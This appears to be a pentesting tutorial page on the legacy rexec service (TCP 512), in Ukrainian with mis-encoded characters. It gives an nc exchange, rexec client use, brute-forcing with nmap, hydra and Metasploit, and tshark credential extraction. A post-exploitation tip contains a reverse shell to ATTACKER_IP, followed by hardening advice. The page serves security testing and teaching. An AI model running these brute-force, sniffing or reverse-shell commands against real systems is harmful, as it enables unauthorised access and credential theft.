# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

Rexec (–≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π **exec**) —î –æ–¥–Ω–∏–º –∑ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏—Ö —Å–µ—Ä–≤—ñ—Å—ñ–≤ Berkeley *r*-—Å–µ—Ä–≤—ñ—Å—ñ–≤ (—Ä–∞–∑–æ–º –∑ `rlogin`, `rsh`, ‚Ä¶). –í—ñ–Ω –Ω–∞–¥–∞—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥**, **–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—É –ª–∏—à–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—è**. –ü—Ä–æ—Ç–æ–∫–æ–ª –±—É–≤ –≤–∏–∑–Ω–∞—á–µ–Ω–∏–π –Ω–∞ –ø–æ—á–∞—Ç–∫—É 1980-—Ö —Ä–æ–∫—ñ–≤ (–¥–∏–≤. RFC 1060) —ñ –≤ –¥–∞–Ω–∏–π —á–∞—Å –≤–≤–∞–∂–∞—î—Ç—å—Å—è **–Ω–µ–∑–∞—Ö–∏—â–µ–Ω–∏–º –∑–∞ –¥–∏–∑–∞–π–Ω–æ–º**. –¢–∏–º –Ω–µ –º–µ–Ω—à, –≤—ñ–Ω –≤—Å–µ —â–µ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–π –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —É –¥–µ—è–∫–æ–º—É –∑–∞—Å—Ç–∞—Ä—ñ–ª–æ–º—É UNIX / –º–µ—Ä–µ–∂–µ–≤–æ–º—É –æ–±–ª–∞–¥–Ω–∞–Ω–Ω—ñ —ñ —ñ–Ω–æ–¥—ñ –∑'—è–≤–ª—è—î—Ç—å—Å—è –ø—ñ–¥ —á–∞—Å –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö pentest.

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> üî•  –£–≤–µ—Å—å —Ç—Ä–∞—Ñ—ñ–∫ ‚Äì –≤–∫–ª—é—á–∞—é—á–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ ‚Äì –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è **–Ω–µ–∫–æ–¥–æ–≤–∞–Ω–∏–º**. –ë—É–¥—å-—Ö—Ç–æ, —Ö—Ç–æ –º–∞—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–ø–∏—Ç–∏ –º–µ—Ä–µ–∂—É, –º–æ–∂–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –ø–∞—Ä–æ–ª—å —Ç–∞ –∫–æ–º–∞–Ω–¥—É.

### –®–≤–∏–¥–∫–∏–π –æ–≥–ª—è–¥ –ø—Ä–æ—Ç–æ–∫–æ–ª—É

1. –ö–ª—ñ—î–Ω—Ç –ø—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è –¥–æ TCP 512.
2. –ö–ª—ñ—î–Ω—Ç –Ω–∞–¥—Å–∏–ª–∞—î —Ç—Ä–∏ **NUL-—Ç–µ—Ä–º—ñ–Ω–æ–≤–∞–Ω—ñ** —Ä—è–¥–∫–∏:
* –Ω–æ–º–µ—Ä –ø–æ—Ä—Ç—É (–≤ ASCII), –Ω–∞ —è–∫–æ–º—É –≤—ñ–Ω –±–∞–∂–∞—î –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ stdout/stderr (—á–∞—Å—Ç–æ `0`),
* **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**,
* **–ø–∞—Ä–æ–ª—å**.
3. –ù–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è —Ñ—ñ–Ω–∞–ª—å–Ω–∏–π NUL-—Ç–µ—Ä–º—ñ–Ω–æ–≤–∞–Ω–∏–π —Ä—è–¥–æ–∫ –∑ **–∫–æ–º–∞–Ω–¥–æ—é** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.
4. –°–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —î–¥–∏–Ω–∏–º 8-–±—ñ—Ç–Ω–∏–º –±–∞–π—Ç–æ–º —Å—Ç–∞—Ç—É—Å—É (0 = —É—Å–ø—ñ—Ö, `1` = –Ω–µ–≤–¥–∞—á–∞), –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î –≤–∏—Ö—ñ–¥ –∫–æ–º–∞–Ω–¥–∏.

–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤—ñ–¥—Ç–≤–æ—Ä–∏—Ç–∏ –æ–±–º—ñ–Ω, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ª–∏—à–µ `echo -e` —Ç–∞ `nc`:
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
–Ø–∫—â–æ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥—ñ–π—Å–Ω—ñ, –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –≤–∏—Ö—ñ–¥ `id` –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –Ω–∞ —Ç–æ–º—É –∂ –∑'—î–¥–Ω–∞–Ω–Ω—ñ.

### –†—É—á–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑ –∫–ª—ñ—î–Ω—Ç–æ–º

–ë–∞–≥–∞—Ç–æ –¥–∏—Å—Ç—Ä–∏–±—É—Ç–∏–≤—ñ–≤ Linux –≤—Å–µ —â–µ –ø–æ—Å—Ç–∞—á–∞—é—Ç—å –∑–∞—Å—Ç–∞—Ä—ñ–ª–∏–π –∫–ª—ñ—î–Ω—Ç —É –ø–∞–∫–µ—Ç—ñ **inetutils-rexec** / **rsh-client**:
```bash
rexec -l user -p password <target> "uname -a"
```
–Ø–∫—â–æ `-p` –ø—Ä–æ–ø—É—â–µ–Ω–æ, –∫–ª—ñ—î–Ω—Ç –∑–∞–ø–∏—Ç–∞—î –ø–∞—Ä–æ–ª—å —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ (–≤–∏–¥–∏–º–∏–π –≤ –º–µ—Ä–µ–∂—ñ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ!).

---
## –ü–µ—Ä–µ—Ä–∞—Ö—É–Ω–æ–∫ —Ç–∞ –ë—Ä—É—Ç—Ñ–æ—Ä—Å

### [**–ë—Ä—É—Ç—Ñ–æ—Ä—Å**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
`rexec-brute` NSE –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ—Ç–æ–∫–æ–ª, –æ–ø–∏—Å–∞–Ω–∏–π –≤–∏—â–µ, —â–æ–± –¥—É–∂–µ —à–≤–∏–¥–∫–æ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ.

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` –º–∞—î —Å–ø–µ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π **rexec** –º–æ–¥—É–ª—å —ñ –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –Ω–∞–π—à–≤–∏–¥—à–∏–º –æ—Ñ–ª–∞–π–Ω –±—Ä—É—Ç—Ñ–æ—Ä—Å–µ—Ä–æ–º. `medusa` (`-M REXEC`) —Ç–∞ `ncrack` (`rexec` –º–æ–¥—É–ª—å) –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è —Ç–∞–∫ —Å–∞–º–æ.

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
–ú–æ–¥—É–ª—å —Å—Ç–≤–æ—Ä–∏—Ç—å –æ–±–æ–ª–æ–Ω–∫—É –ø—Ä–∏ —É—Å–ø—ñ—Ö—É —Ç–∞ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤ –±–∞–∑—ñ –¥–∞–Ω–∏—Ö.

---
## –ü–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö

–û—Å–∫—ñ–ª—å–∫–∏ –≤—Å–µ –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ, **–ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –º–µ—Ä–µ–∂—ñ –±–µ–∑—Ü—ñ–Ω–Ω–µ**. –ó –∫–æ–ø—ñ—î—é —Ç—Ä–∞—Ñ—ñ–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –Ω–µ —Ç–æ—Ä–∫–∞—é—á–∏—Å—å —Ü—ñ–ª—ñ:
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark —É–≤—ñ–º–∫–Ω—ñ—Ç—å *Decode As ‚Ä¶‚Äã* TCP 512 ‚Üí REXEC, —â–æ–± –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –∫—Ä–∞—Å–∏–≤–æ —Ä–æ–∑–ø–∞—Ä—Å–µ–Ω—ñ –ø–æ–ª—è.)

---
## –ü–æ—Ä–∞–¥–∏ –ø—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó

* –ö–æ–º–∞–Ω–¥–∏ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –∑ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –Ω–∞–¥–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –Ø–∫—â–æ `/etc/pam.d/rexec` –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `pam_rootok`), —ñ–Ω–æ–¥—ñ –º–æ–∂–ª–∏–≤—ñ root shell.
* Rexec —ñ–≥–Ω–æ—Ä—É—î –æ–±–æ–ª–æ–Ω–∫—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ –≤–∏–∫–æ–Ω—É—î –∫–æ–º–∞–Ω–¥—É —á–µ—Ä–µ–∑ `/bin/sh -c <cmd>`. –¢–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ç–∏–ø–æ–≤—ñ —Ç—Ä—é–∫–∏ –∑ –æ–±–æ–ª–æ–Ω–∫–æ—é (`;`, ``$( )``, –∑–≤–æ—Ä–æ—Ç–Ω—ñ –ª–∞–ø–∫–∏) –¥–ª—è –∑'—î–¥–Ω–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Ö –∫–æ–º–∞–Ω–¥ –∞–±–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∑–≤–æ—Ä–æ—Ç–Ω–∏—Ö shell:
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* –ü–∞—Ä–æ–ª—ñ —á–∞—Å—Ç–æ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ **~/.netrc** –Ω–∞ —ñ–Ω—à–∏—Ö —Å–∏—Å—Ç–µ–º–∞—Ö; —è–∫—â–æ –≤–∏ –∑–ª–∞–º–∞—î—Ç–µ –æ–¥–∏–Ω —Ö–æ—Å—Ç, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ó—Ö –¥–ª—è –±—ñ—á–Ω–æ–≥–æ –ø–µ—Ä–µ–º—ñ—â–µ–Ω–Ω—è.

---
## –£–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è / –í–∏—è–≤–ª–µ–Ω–Ω—è

* **–ù–µ –ø—ñ–¥–¥–∞–≤–∞–π—Ç–µ rexec**; –∑–∞–º—ñ–Ω—ñ—Ç—å –π–æ–≥–æ –Ω–∞ SSH. –ü—Ä–∞–∫—Ç–∏—á–Ω–æ –≤—Å—ñ —Å—É—á–∞—Å–Ω—ñ *inetd* —Å—É–ø–µ—Ä–≤—ñ–∑–æ—Ä–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∫–æ–º–µ–Ω—Ç—É—é—Ç—å —Ü—é —Å–ª—É–∂–±—É.
* –Ø–∫—â–æ –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –π–æ–≥–æ –∑–±–µ—Ä–µ–≥—Ç–∏, –æ–±–º–µ–∂—Ç–µ –¥–æ—Å—Ç—É–ø –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é TCP –æ–±–≥–æ—Ä—Ç–æ–∫ (`/etc/hosts.allow`) –∞–±–æ –ø—Ä–∞–≤–∏–ª –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–∞ —Ç–∞ –∑–∞–±–µ–∑–ø–µ—á—Ç–µ –Ω–∞–¥—ñ–π–Ω—ñ –ø–∞—Ä–æ–ª—ñ –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É.
* –ú–æ–Ω—ñ—Ç–æ—Ä—Ç–µ —Ç—Ä–∞—Ñ—ñ–∫ –Ω–∞ :512 —Ç–∞ –∑–∞–ø—É—Å–∫–∏ –ø—Ä–æ—Ü–µ—Å—É `rexecd`. –û–¥–∏–Ω –∑–∞—Ö–æ–ø–ª–µ–Ω–∏–π –ø–∞–∫–µ—Ç –¥–æ—Å—Ç–∞—Ç–Ω—ñ–π –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó.
* –í–∏–º–∫–Ω—ñ—Ç—å `rexec`, `rlogin`, `rsh` —Ä–∞–∑–æ–º ‚Äì –≤–æ–Ω–∏ –¥—ñ–ª—è—Ç—å –±—ñ–ª—å—à—ñ—Å—Ç—å –æ–¥–Ω–æ–≥–æ –π —Ç–æ–≥–æ –∂ –∫–æ–¥—É —Ç–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π.

---

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* –î–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—è Nmap NSE `rexec-brute` ‚Äì [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* –ú–æ–¥—É–ª—å Rapid7 Metasploit `auxiliary/scanner/rservices/rexec_login` ‚Äì [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
